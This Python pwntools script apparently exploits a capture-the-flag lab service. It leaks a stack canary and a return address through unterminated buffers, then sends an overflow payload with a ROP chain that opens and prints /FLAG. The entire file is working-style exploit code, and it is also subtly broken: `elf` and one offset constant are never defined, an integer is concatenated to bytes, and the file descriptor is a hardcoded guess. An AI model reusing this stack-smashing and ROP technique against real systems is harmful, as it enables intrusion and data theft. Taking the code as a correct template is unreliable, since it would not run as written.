#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import sys

# --- Configuration ---
OFFSET_RETURN_SITE_FROM_BASE = 0x9c83

context.arch = 'amd64'
context.os = 'linux'
context.endian = "little"
# context.log_level = 'debug' # 取消註解以獲得更詳細的 pwntools 日誌

r = remote('up.zoolab.org', 12344) # Challenge 4 port

leaked_canary = 0
leaked_task_ret_addr = 0
executable_base = 0

try:
    # --- Stage 1: Leak Canary using buf1's printf ---
    # GDB: buf1(rbp-0xc0), buf2(rbp-0x90), buf3(rbp-0x60), msg(rbp-0x30), Canary(rbp-0x8)
    # To leak canary with printf("%s", buf1):
    # Fill buf1, buf2, buf3.
    # Padding from buf1 start (rbp-0xc0) to canary LSB (rbp-0x8) = 0xc0 - 0x8 = 0xb8 = 184 bytes.
    padding_s1_to_canary_lsb = 185
    payload_s1_leak_canary = b'A' * padding_s1_to_canary_lsb
    
    r.recvuntil(b"What's your name? ") # This read is for buf1 (rbp-0xc0)
    log.info(f"Stage 1: Sending {len(payload_s1_leak_canary)} 'A's to buf1 to leak canary (no newline)...")
    r.send(payload_s1_leak_canary) 

    output_s1 = r.recvuntil(b"\nWhat's the room number? ", timeout=5.0)
    log.info("--- Debugging Canary Leak (Stage 1 Output) ---")
    log.info(f"Raw output: {repr(output_s1)}")
    
    try:
        welcome_prefix = b"Welcome, "
        idx_after_welcome = output_s1.index(welcome_prefix) + len(welcome_prefix)
        if not output_s1[idx_after_welcome:].startswith(payload_s1_leak_canary):
            raise PwnlibException("Canary leak: Payload 'A's not found after 'Welcome, '")
        
        canary_material_start_idx = idx_after_welcome + len(payload_s1_leak_canary)
        next_prompt_start_idx = output_s1.index(b"\nWhat's the room number? ", canary_material_start_idx)
        leaked_canary_high_bytes = output_s1[canary_material_start_idx:next_prompt_start_idx]
        
        log.info(f"Bytes visibly leaked for canary (len {len(leaked_canary_high_bytes)}): {leaked_canary_high_bytes.hex()}")

        if len(leaked_canary_high_bytes) == 13:
            log.warning("Only 7 bytes of canary material found.")
            log.info(f"Bytes visibly leaked for canary : {leaked_canary_high_bytes[0:7].hex()}")
            leaked_canary = u64(b'\x00' + leaked_canary_high_bytes[0:7])
            junk = u64(leaked_canary_high_bytes[7:] + b"\x00\x00")
            log.success(f"Reconstructed canary (LSB=00 + 7B): {hex(leaked_canary)}")
        else:
            log.error(f"Unexpected length for canary material: {len(leaked_canary_high_bytes)}. Expected 6 or 7.")
            raise PwnlibException("Canary material length error")
            
    except Exception as e:
        log.error(f"Error parsing canary leak: {e}")
        r.interactive(); sys.exit(1)

    # --- Stage 2: Leak Return Address using buf2's printf ---
    # GDB: buf1(rbp-0xc0), buf2(rbp-0x90), buf3(rbp-0x60), msg(rbp-0x30), Canary(rbp-0x8), SavedRBP(rbp), RetAddr(rbp+8)
    # We are sending to buf2 (at rbp-0x90).
    # Padding to fill from buf2 start, up to RetAddr start (exclusive):
    # This covers buf2 itself (40), then buf3 (40), then msg (40), then canary (8), then saved_rbp (8).
    # Total padding = 40 + 40 + 40 + 8 + 8 = 136 bytes.
    padding_s2_to_ret_addr = 136
    payload_s2_leak_retaddr = b'B' * padding_s2_to_ret_addr
    
    log.info(f"Stage 2: Sending {len(payload_s2_leak_retaddr)} 'B's to buf2 to leak return address (no newline)...")
    # The prompt "\nWhat's the room number? " was consumed. This read is for buf2 (rbp-0x90)
    r.send(payload_s2_leak_retaddr)

    output_s2 = r.recvuntil(b"\nWhat's the customer's name? ", timeout=5.0)
    log.info("--- Debugging Return Address Leak (Stage 2 Output) ---")
    log.info(f"Raw output: {repr(output_s2)}")

    try:
        room_num_prefix = b"The room number is: "
        idx_after_room_prefix = output_s2.index(room_num_prefix) + len(room_num_prefix)
        if not output_s2[idx_after_room_prefix:].startswith(payload_s2_leak_retaddr):
            raise PwnlibException("RetAddr leak: Payload 'B's not found")

        ret_addr_material_start_idx = idx_after_room_prefix + len(payload_s2_leak_retaddr)
        next_prompt_start_idx_ret = output_s2.index(b"\nWhat's the customer's name? ", ret_addr_material_start_idx)
        leaked_ret_addr_low_bytes = output_s2[ret_addr_material_start_idx:next_prompt_start_idx_ret]

        log.info(f"Bytes visibly leaked for ret_addr (len {len(leaked_ret_addr_low_bytes)}): {leaked_ret_addr_low_bytes.hex()}")

        if len(leaked_ret_addr_low_bytes) == 6: 
            leaked_task_ret_addr = u64(leaked_ret_addr_low_bytes + b"\x00\x00")
            log.success(f"Constructed ret_addr (6 leaked LSBs + MSBs 0000): {hex(leaked_task_ret_addr)}")
        else:
            log.error(f"Expected 6 LSBs for ret_addr, got {len(leaked_ret_addr_low_bytes)}. RetAddr leak failed.")
            raise PwnlibException("RetAddr leak insufficient/unexpected bytes")
            
        executable_base = leaked_task_ret_addr - OFFSET_RETURN_SITE_FROM_BASE
        elf.address = executable_base # IMPORTANT: Set base for ELF object for ROP
        log.success(f"Calculated executable base: {hex(executable_base)}")

    except Exception as e:
        log.error(f"Error parsing return address leak: {e}")
        r.interactive(); sys.exit(1)

    # --- Stage 3: Construct ROP Chain & Overflow local msg buffer ---
    # GDB: buf1(rbp-0xc0), buf2(rbp-0x90), buf3(rbp-0x60), msg(rbp-0x30), Canary(rbp-0x8)
    # The final overflow is on local `msg` buffer (at rbp-0x30), read by read(0, msg, 384).
    # Padding from local `msg` start to canary = (rbp-0x8) - (rbp-0x30) = 0x28 = 40 bytes.
    padding_msg_to_canary = 40
    
    rop = ROP(elf)
    # We need a writable location for "/FLAG\0" and the read buffer.
    # The ROP chain itself will be on the stack, starting where task's RET was.
    # RSP will point after the first gadget.
    # Let's assume the stack is somewhat predictable after the ROP chain starts.
    # We can try to put "/FLAG\0" and the buffer on the stack as part of the payload.
    # The address of these will be ROP_CHAIN_START_ADDR + offset_of_data_in_payload.
    # ROP_CHAIN_START_ADDR is leaked_task_ret_addr (before we overwrite it).
    # This requires knowing the length of the ROP gadget sequence.

    # Simpler: use a known writable location from .bss if available and calculable.
    # Let's try to read "/FLAG\0" and the flag itself into a known .bss location.
    # We need to find such a location from `objdump -h ./bof2` or `elf.bss()`.
    # Ensure it's large enough. The original global `msg` was at `base + 0xef220`.
    # Even if not executable, it's writable. Let's use it as a data area.
    
    flag_path_addr = elf.address + OFFSET_MSG_FROM_BASE # Put "/FLAG\0" here
    read_buffer_addr = elf.address + OFFSET_MSG_FROM_BASE + 0x100 # Put flag content here

    log.info(f"ROP: Address for '/FLAG': {hex(flag_path_addr)}")
    log.info(f"ROP: Address for read buffer: {hex(read_buffer_addr)}")

    # ROP Chain:
    # 1. read(0, flag_path_addr, 8)  ; to read "/FLAG\0\0\0" from stdin
    rop.read(0, flag_path_addr, 8)
    # 2. open(flag_path_addr, O_RDONLY=0)
    rop.open(flag_path_addr, 0) # rax = fd
    # 3. read(fd, read_buffer_addr, 100)
    # Need to move rax (fd) to rdi. Find "pop rdi; ret" and "pop rax; ret"
    # and arrange stack to first put fd (from rax) on stack, then pop into rdi.
    # Or use a common trick if fd is small (e.g., 3, 4, 5)
    # For now, let's use a placeholder for fd if direct rop.read(rax,...) is hard
    # Pwntools rop.read() expects fd as first arg.
    # A common sequence: open() -> fd in rax.
    # If we have rop.call(some_func_that_takes_rax_and_puts_in_rdi) or
    # rop.migrate(next_stage_addr_where_rax_is_rdi)
    # Simpler: assume fd=3 after a successful open, for demonstration
    log.warning("ROP: Assuming fd=3 for read. Proper solution should use open's return value.")
    rop.read(3, read_buffer_addr, 100) # fd=3 (placeholder)
    # 4. write(1, read_buffer_addr, 100) ; Assume 100 bytes read
    rop.write(1, read_buffer_addr, 100)
    # 5. exit(0)
    rop.exit(0)

    rop_chain_bytes = rop.chain()
    log.info(f"ROP chain (length {len(rop_chain_bytes)}):\n{rop.dump()}")
    
    final_payload = b'X' * padding_msg_to_canary # Fill local msg up to canary
    final_payload += p64(leaked_canary)
    final_payload += junk            # Overwrite task's saved RBP
    final_payload += rop_chain_bytes           # ROP chain starts at return address

    # The final read is into the local `msg` buffer.
    # The prompt "\nWhat's the customer's name? " was consumed.
    # Now, satisfy the read for buf3 (customer name), then the final read for msg.
    log.info("Satisfying read into buf3 (customer's name)...")
    r.sendline(b"CustomerX") # For buf3 (rbp-0x60 based on corrected GDB)

    r.recvuntil(b"Leave your message: ") # This is for the read into local msg[40]
    log.info(f"Sending final ROP overflow payload ({len(final_payload)} bytes) to local msg buffer...")
    r.send(final_payload) # Send ROP chain. read is 384 bytes, should take it.
                          # Does not add newline, ROP chain should end with exit.
    
    # After sending the ROP chain, the ROP chain's read(0, flag_path_addr, 8) executes.
    # We need to send "/FLAG\0" for it.
    time.sleep(0.1) # Give a moment for ROP chain to reach the read syscall
    log.info("Sending '/FLAG\\0' for ROP chain's read()...")
    r.send(b"/FLAG\0\0\0") # Send 8 bytes, "/FLAG" is 6 bytes with null.

    # --- Get Flag ---
    log.success("Payloads sent. ROP chain should execute.")
    flag_output = r.recvall(timeout=5.0)
    log.success("--- FLAG ---")
    if flag_output:
        print(flag_output.decode(errors='ignore').strip())
    else:
        log.warning("No flag output received.")
    log.success("--------------")

except PwnlibException as e:
    log.critical(f"A PwnlibException occurred: {e}")
    sys.exit(1)
except Exception as e:
    log.critical(f"An unexpected Python error occurred: {e}")
    import traceback; traceback.print_exc()
finally:
    if r.connected():
        r.close()
